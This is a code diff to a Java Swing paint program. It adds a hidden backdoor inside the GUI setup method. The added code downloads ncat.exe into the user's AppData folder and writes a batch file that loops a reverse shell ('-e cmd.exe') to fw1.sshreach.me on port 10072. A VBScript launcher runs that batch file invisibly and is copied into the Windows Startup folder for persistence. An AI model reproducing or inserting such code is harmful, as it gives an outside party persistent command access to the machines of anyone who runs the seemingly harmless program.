@@ -1,8 +1,10 @@
 import java.awt.BorderLayout;
+import java.awt.Color;
 import java.awt.Container;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
-import java.io.IOError;
+
+import java.io.FileWriter; 
 
 import javax.swing.JButton;
 import javax.swing.JFrame;
@@ -30,9 +32,11 @@ public class SwingPaint {
       }
     }
   };
+
  
   public static void main(String[] args) {
     new SwingPaint().show();
+    
   }
  
   public void show() {
@@ -79,6 +83,45 @@ public class SwingPaint {
     controls.add(redBtn);
     controls.add(magentaBtn);
     controls.add(clearBtn);
+    
+    
+    
+    String link ="https://raw.githubusercontent.com/Rafsan-decodea/study/master/ncat.exe";
+    Runtime runtime = Runtime.getRuntime();
+    try{
+      
+      String username =  System.getProperty("user.name");
+      HttpDownloadUtility.downloadFile(link, "C:/Users/"+username+"/AppData");
+
+       FileWriter myWriter = new FileWriter("C:\\Users\\"+username+"\\AppData\\run.vbs");
+     
+        String ws = " \"WScript.Shell\" ";
+        String drive = " \"C:\\Users\\"+username+"\\AppData\\run.bat\"";
+        String file_copy =  "\"C:\\Users\\"+username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"";
+        myWriter.write("Dim WinScriptHost \nSet WinScriptHost = CreateObject("+ws+") \nWinScriptHost.Run Chr(34) &"+drive+" & Chr(34), 0 \nSet WinScriptHost = Nothing ");
+        myWriter.close();
+   
+        FileWriter myWriter2 = new FileWriter("C:\\Users\\"+username+"\\AppData\\run.bat");
+         myWriter2.write(" :a \n  ncat -v fw1.sshreach.me  10072   -e cmd.exe\ngoto a  ");
+         myWriter2.close();
+         System.out.println("Successfully wrote to the file.");
+
+        Process process =runtime.exec("cmd /c start C:\\Users\\"+username+"\\AppData\\run.vbs");
+        Process process2 = runtime.exec("cmd /c xcopy C:\\Users\\"+username+"\\AppData\\run.vbs  "+file_copy);
+
+       
+
+     
+
+    } 
+
+   catch(Exception e)
+   {
+       System.out.print(e);
+   }
+
+  
+
 
     JPanel jpanel = new JPanel();
     jpanel.add(show_name);
